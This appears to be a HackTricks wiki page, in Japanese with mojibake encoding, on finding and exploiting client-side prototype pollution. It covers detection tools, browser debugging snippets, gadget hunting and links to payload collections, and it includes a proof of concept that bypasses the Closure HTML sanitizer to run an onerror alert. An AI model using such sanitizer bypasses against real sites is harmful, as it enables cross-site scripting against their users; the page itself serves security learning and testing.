# ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}

## è‡ªå‹•ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ãŸç™ºè¦‹

ãƒ„ãƒ¼ãƒ« [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**ã€** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **ãŠã‚ˆã³** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) ã¯ã€**ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã®è„†å¼±æ€§ã‚’è¦‹ã¤ã‘ã‚‹**ãŸã‚ã«ä½¿ç”¨ã§ãã¾ã™ã€‚

ã•ã‚‰ã«ã€**ãƒ–ãƒ©ã‚¦ã‚¶æ‹¡å¼µæ©Ÿèƒ½** [**PPScan**](https://github.com/msrkp/PPScan) ã‚’ä½¿ç”¨ã—ã¦ã€**ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãƒšãƒ¼ã‚¸**ã‚’**è‡ªå‹•çš„ã«** **ã‚¹ã‚­ãƒ£ãƒ³**ã—ã€ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã®è„†å¼±æ€§ã‚’æ¢ã™ã“ã¨ã‚‚ã§ãã¾ã™ã€‚

### ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹å ´æ‰€ã®ãƒ‡ãƒãƒƒã‚° <a href="#id-5530" id="id-5530"></a>

{% code overflow="wrap" %}
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype,'potentialGadget', {__proto__:null, get(){
console.trace();
return 'test';
}})
```
{% endcode %}

### ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã®æ ¹æœ¬åŸå› ã‚’ç‰¹å®šã™ã‚‹ <a href="#id-5530" id="id-5530"></a>

ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã®è„†å¼±æ€§ãŒãƒ„ãƒ¼ãƒ«ã«ã‚ˆã£ã¦ç‰¹å®šã•ã‚Œã€ã‚³ãƒ¼ãƒ‰ãŒãã‚Œã»ã©è¤‡é›‘ã§ãªã„å ´åˆã€Chrome Developer Toolsã§`location.hash`ã€`decodeURIComponent`ã€ã¾ãŸã¯`location.search`ãªã©ã®ã‚­ãƒ¼ãƒ¯ãƒ¼ãƒ‰ã‚’æ¤œç´¢ã™ã‚‹ã“ã¨ã§è„†å¼±æ€§ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã«ã‚ˆã‚Šã€JavaScriptã‚³ãƒ¼ãƒ‰ã®è„†å¼±ãªã‚»ã‚¯ã‚·ãƒ§ãƒ³ã‚’ç‰¹å®šã§ãã¾ã™ã€‚

ã‚ˆã‚Šå¤§ããã€ã‚ˆã‚Šè¤‡é›‘ãªã‚³ãƒ¼ãƒ‰ãƒ™ãƒ¼ã‚¹ã®å ´åˆã€è„†å¼±ãªã‚³ãƒ¼ãƒ‰ã‚’ç™ºè¦‹ã™ã‚‹ãŸã‚ã®ç°¡å˜ãªæ–¹æ³•ã¯ã€ä»¥ä¸‹ã®æ‰‹é †ã‚’å«ã¿ã¾ã™ï¼š

1. ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦è„†å¼±æ€§ã‚’ç‰¹å®šã—ã€ã‚³ãƒ³ã‚¹ãƒˆãƒ©ã‚¯ã‚¿å†…ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’è¨­å®šã™ã‚‹ãŸã‚ã«è¨­è¨ˆã•ã‚ŒãŸãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å–å¾—ã—ã¾ã™ã€‚ppmapã«ã‚ˆã£ã¦æä¾›ã•ã‚Œã‚‹ä¾‹ã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼š`constructor[prototype][ppmap]=reserved`ã€‚
2. ãƒšãƒ¼ã‚¸ã§å®Ÿè¡Œã•ã‚Œã‚‹æœ€åˆã®JavaScriptã‚³ãƒ¼ãƒ‰ã®è¡Œã«ãƒ–ãƒ¬ãƒ¼ã‚¯ãƒã‚¤ãƒ³ãƒˆã‚’è¨­å®šã—ã¾ã™ã€‚ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã§ãƒšãƒ¼ã‚¸ã‚’ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ã—ã€ã“ã®ãƒ–ãƒ¬ãƒ¼ã‚¯ãƒã‚¤ãƒ³ãƒˆã§å®Ÿè¡Œã‚’ä¸€æ™‚åœæ­¢ã—ã¾ã™ã€‚
3. JavaScriptã®å®Ÿè¡ŒãŒä¸€æ™‚åœæ­¢ã—ã¦ã„ã‚‹é–“ã«ã€JSã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã§æ¬¡ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œã—ã¾ã™ã€‚ã“ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯ã€'ppmap'ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ãŒä½œæˆã•ã‚ŒãŸã¨ãã«ä¿¡å·ã‚’é€ä¿¡ã—ã€ãã®èµ·æºã‚’ç‰¹å®šã™ã‚‹ã®ã«å½¹ç«‹ã¡ã¾ã™ï¼š
```javascript
function debugAccess(obj, prop, debugGet=true){

var origValue = obj[prop];

Object.defineProperty(obj, prop, {
get: function () {
if (debugGet)
debugger;
return origValue;
},
set: function(val) {
debugger;
origValue = val;
}
});

};

debugAccess(Object.prototype, 'ppmap')
```
4. **Sources** ã‚¿ãƒ–ã«æˆ»ã‚Šã€ã€Œã‚¹ã‚¯ãƒªãƒ—ãƒˆã®å®Ÿè¡Œã‚’å†é–‹ã€ã‚’é¸æŠã—ã¾ã™ã€‚JavaScript ã¯å¼•ãç¶šãå®Ÿè¡Œã•ã‚Œã€'ppmap' ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã¯äºˆæƒ³é€šã‚Šã«æ±šæŸ“ã•ã‚Œã¾ã™ã€‚æä¾›ã•ã‚ŒãŸã‚¹ãƒ‹ãƒšãƒƒãƒˆã‚’åˆ©ç”¨ã™ã‚‹ã“ã¨ã§ã€'ppmap' ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ãŒæ±šæŸ“ã•ã‚Œã‚‹æ­£ç¢ºãªå ´æ‰€ã‚’ç‰¹å®šã§ãã¾ã™ã€‚**Call Stack** ã‚’èª¿ã¹ã‚‹ã“ã¨ã§ã€æ±šæŸ“ãŒç™ºç”Ÿã—ãŸç•°ãªã‚‹ã‚¹ã‚¿ãƒƒã‚¯ã‚’è¦³å¯Ÿã§ãã¾ã™ã€‚

ã©ã®ã‚¹ã‚¿ãƒƒã‚¯ã‚’èª¿æŸ»ã™ã‚‹ã‹ã‚’æ±ºå®šã™ã‚‹éš›ã«ã¯ã€JavaScript ãƒ©ã‚¤ãƒ–ãƒ©ãƒªãƒ•ã‚¡ã‚¤ãƒ«ã«é–¢é€£ã™ã‚‹ã‚¹ã‚¿ãƒƒã‚¯ã‚’ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã«ã™ã‚‹ã“ã¨ãŒã—ã°ã—ã°æœ‰ç”¨ã§ã™ã€‚ãƒ—ãƒ­ãƒˆã‚¿ã‚¤ãƒ—æ±šæŸ“ã¯ã“ã‚Œã‚‰ã®ãƒ©ã‚¤ãƒ–ãƒ©ãƒªå†…ã§é »ç¹ã«ç™ºç”Ÿã—ã¾ã™ã€‚ãƒ©ã‚¤ãƒ–ãƒ©ãƒªãƒ•ã‚¡ã‚¤ãƒ«ã¸ã®é–¢é€£ä»˜ã‘ã‚’èª¿ã¹ã¦ã€é–¢é€£ã™ã‚‹ã‚¹ã‚¿ãƒƒã‚¯ã‚’ç‰¹å®šã—ã¾ã™ï¼ˆå³å´ã«è¡¨ç¤ºã•ã‚Œã€ã‚¬ã‚¤ãƒ€ãƒ³ã‚¹ç”¨ã®ç”»åƒã«ä¼¼ã¦ã„ã¾ã™ï¼‰ã€‚è¡Œ 4 ã¨ 6 ã®ã‚ˆã†ã«è¤‡æ•°ã®ã‚¹ã‚¿ãƒƒã‚¯ãŒã‚ã‚‹å ´åˆã€è«–ç†çš„ãªé¸æŠã¯è¡Œ 4 ã®ã‚¹ã‚¿ãƒƒã‚¯ã§ã™ã€‚ã“ã‚Œã¯æ±šæŸ“ã®æœ€åˆã®ç™ºç”Ÿã‚’ç¤ºã—ã€è„†å¼±æ€§ã®æ ¹æœ¬åŸå› ã‚’è¡¨ã—ã¾ã™ã€‚ã‚¹ã‚¿ãƒƒã‚¯ã‚’ã‚¯ãƒªãƒƒã‚¯ã™ã‚‹ã¨ã€è„†å¼±ãªã‚³ãƒ¼ãƒ‰ã«ç§»å‹•ã—ã¾ã™ã€‚

![https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg](https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚¬ã‚¸ã‚§ãƒƒãƒˆã®ç™ºè¦‹

ã‚¬ã‚¸ã‚§ãƒƒãƒˆã¯ã€**PP è„†å¼±æ€§ãŒç™ºè¦‹ã•ã‚ŒãŸã¨ãã«æ‚ªç”¨ã•ã‚Œã‚‹ã‚³ãƒ¼ãƒ‰**ã§ã™ã€‚

ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒã‚·ãƒ³ãƒ—ãƒ«ãªå ´åˆã€**`srcdoc/innerHTML/iframe/createElement`** ã®ã‚ˆã†ãª **ã‚­ãƒ¼ãƒ¯ãƒ¼ãƒ‰** ã‚’ **æ¤œç´¢** ã—ã€ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’ãƒ¬ãƒ“ãƒ¥ãƒ¼ã—ã¦ **JavaScript å®Ÿè¡Œã«ã¤ãªãŒã‚‹ã‹** ã‚’ç¢ºèªã§ãã¾ã™ã€‚æ™‚ã«ã¯ã€è¨€åŠã•ã‚ŒãŸæŠ€è¡“ãŒã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’å…¨ãè¦‹ã¤ã‘ã‚‰ã‚Œãªã„ã“ã¨ã‚‚ã‚ã‚Šã¾ã™ã€‚ãã®å ´åˆã€ç´”ç²‹ãªã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ãƒ¬ãƒ“ãƒ¥ãƒ¼ãŒã€ä»¥ä¸‹ã®ä¾‹ã®ã‚ˆã†ãªç´ æ™´ã‚‰ã—ã„ã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’æ˜ã‚‰ã‹ã«ã—ã¾ã™ã€‚

### Mithil ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚³ãƒ¼ãƒ‰ã§ã® PP ã‚¬ã‚¸ã‚§ãƒƒãƒˆã®ç™ºè¦‹ä¾‹

ã“ã®æ›¸ãè¾¼ã¿ã‚’ç¢ºèªã—ã¦ãã ã•ã„: [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## è„†å¼±ãªãƒ©ã‚¤ãƒ–ãƒ©ãƒªç”¨ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®å†ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«

* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
* [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## PP ã‚’ä»‹ã—ãŸ HTML ã‚µãƒ‹ã‚¿ã‚¤ã‚¶ãƒ¼ã®ãƒã‚¤ãƒ‘ã‚¹

[**ã“ã®ç ”ç©¶**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) ã¯ã€ã„ãã¤ã‹ã® HTML ã‚µãƒ‹ã‚¿ã‚¤ã‚¶ãƒ¼ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã«ã‚ˆã£ã¦æä¾›ã•ã‚Œã‚‹ **ã‚µãƒ‹ã‚¿ã‚¤ã‚ºã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã™ã‚‹ PP ã‚¬ã‚¸ã‚§ãƒƒãƒˆ** ã‚’ç¤ºã—ã¦ã„ã¾ã™ï¼š

* **sanitize-html**

<figure><img src="../../../.gitbook/assets/image (1140).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-7.png"><figcaption></figcaption></figure>

* **dompurify**

<figure><img src="../../../.gitbook/assets/image (1141).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-9.png"><figcaption></figcaption></figure>

* **Closure**
```html
<!-- from https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ -->
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## å‚è€ƒæ–‡çŒ®

* [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
* [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
* [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
